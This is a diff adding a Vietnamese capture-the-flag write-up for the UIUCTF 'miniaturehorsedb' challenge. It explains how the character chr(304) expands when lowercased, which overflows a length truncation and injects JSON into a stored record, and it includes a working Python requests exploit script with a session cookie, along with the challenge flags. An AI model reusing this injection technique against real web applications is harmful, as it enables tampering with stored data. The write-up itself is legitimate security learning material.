@@ -73,7 +73,7 @@ def add():
 
 	favorite_value = request.form['favorite_value']
 	if "'" in favorite_value: error = 'Custom favorite may not contain single quote'
-	if len(favorite_value) > 64: 'Custom favorite too long'     # Chổ này chỉ check cũng chỉ check cho vui :))))
+	if len(favorite_value) > 64: 'Custom favorite too long'     # Chổ này cũng chỉ check cho vui :))))
 
 	word = request.form['word']
 	if "'" in word: error = 'Word may not contain single quote'
@@ -120,3 +120,67 @@ Và flag hiện ra XD
 ![img](./imgs/4.png)    
   
 Flag: `uiuctf{My_l33tle_p0ny_5fb234}`  
+  
+## miniaturehorsedb - 417pts  
+  
+[Source code](https://uiuc.tf/files/684fe65529f3dafedc7f81d6283c91d4/handout.tar.gz?token=eyJ1c2VyX2lkIjoxMDcyLCJ0ZWFtX2lkIjoxNTUsImZpbGVfaWQiOjU1fQ.YQfBeQ.0TybIzxbLPPcDsWg39rfflTchqM)    
+  
+Thật ra source code bài này cũng không khác gì mấy so với bài `ponydb` chỉ là chổ check length đã được fix :)))  
+```python3  
+...
+favorite_value = request.form['favorite_value']
+if "'" in favorite_value: error = 'Custom favorite may not contain single quote'
+if len(favorite_value) > 64: error = 'Custom favorite too long'		# Biến error đã được gán
+
+word = request.form['word']
+if "'" in word: error = 'Word may not contain single quote'
+if len(word) > len('antidisestablishmentarianism'): error = 'Word too long'	# Biến error đã được gán
+...
+```  
+  
+Dạo quanh discord thì nhận được hint của tác giả:  
+```python3
+>>> len(chr(304).lower())
+2
+```
+
+Ok tới đây là hiểu rồi, với ký tự có ascii là `304` thì sau khi `lower()` sẽ thành 2 ký tự do đó nên có chiều dài là 2. Nhìn vào source code thì ta thấy có 2 chổ sử dụng hàm `lower()` này là `favorite_key.lower()` và `word.lower()`. Nếu ta sử dụng 64 ký tự `chr(304)` (chỉ cho phép là 64 ký tự) thì ta sẽ có 128 ký tự được tạo ra sau khi đi qua hàm `lower()`, cộng thêm với 64 ký tự `favorite_value` nữa là chỉ 192 ký tự => vẫn chưa đủ để bị `truncate`. Vì thế, ta phải tận dụng thêm 28 ký tự của param `word` nữa, tất cả là do:  
+  
+```python3
+if len(word) > len('antidisestablishmentarianism'): error = 'Word too long'
+```  
+Với `len('antidisestablishmentarianism') = 28`, nên tổng sẽ được sẽ được 248, cộng thêm các ký tự như `{`, `}`, `"`, `:` theo syntax của json thì sẽ hơn 256 ký tự.  
+  
+Sau một lúc debug và tính toán thì được cái script để send payload:  
+  
+```python3
+import requests
+
+url = 'http://miniaturehorsedb.chal.uiuc.tf/pony'
+r = requests.Session()
+
+data = {
+    'name' : 'name',
+    'image': 'image',
+    'favorite_key' : chr(304) * 64,
+    'favorite_value': '","number":1337,"a":"' + chr(304) * (64 - len('","number":1337,"a":"')),
+    'word' : chr(304) * 22 + 'aaa"}',
+    'number': 11,
+    'bio' : 'bio'
+}
+
+cookies = {
+        'session': '.eJwNytENwCAIBcBdmABR5NltikDiDE13b-_7HjpBF2GlYG_k4lZARUoXQEU9PaKP0h1sqc0n6_A_Vjfca4jVFND7Ae5QFAc.YQfrhQ.UMwPh5qAN8BS2zIXLte6E-h7Az4'
+}
+
+resp = r.post(url, data=data, cookies = cookies) #, proxies = proxy)
+```  
+Dữ liệu trong database lúc này sẽ có dạng như sau:  
+![img](./imgs/5.png)  
+  
+Refresh và có flag XD  
+  
+![img](./imgs/6.png)  
+  
+Flag: `uiuctf{wh0ops_th1s_on3_was_harder_r1ght_9fa2b}`  
+  
